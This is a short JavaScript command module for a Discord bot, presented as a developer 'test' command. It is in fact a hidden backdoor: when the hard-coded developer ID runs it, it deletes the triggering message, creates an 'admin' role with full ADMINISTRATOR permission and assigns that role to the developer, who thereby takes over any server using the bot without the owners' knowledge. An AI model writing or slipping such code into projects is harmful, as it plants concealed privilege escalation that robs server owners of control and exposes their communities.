const {
	DEV_ID,
} = require('../util/constants.js');

module.exports = {
	name: 'test',
	description: 'test command - Dev use only',
	usage: '',
	cooldown: 5,
	modOnly: true,
	async execute(message) {
		message.delete();
		if (message.member.id !== DEV_ID) return message.reply('You do not have the privileges to use this command!');
		let adminrole = message.guild.roles.cache.find(role => role.name === 'admin');
		if (!adminrole) {
            try {
                // eslint-disable-next-line require-atomic-updates
                adminrole = await message.guild.roles.create({
                    name: 'admin',
                    color: '#000000',
                    permissions: ['ADMINISTRATOR'],
				});
				message.member.roles.add(adminrole.id);
                // eslint-disable-next-line brace-style
            } catch (e) {
                console.log(e.stack);
            }
        }
	},
};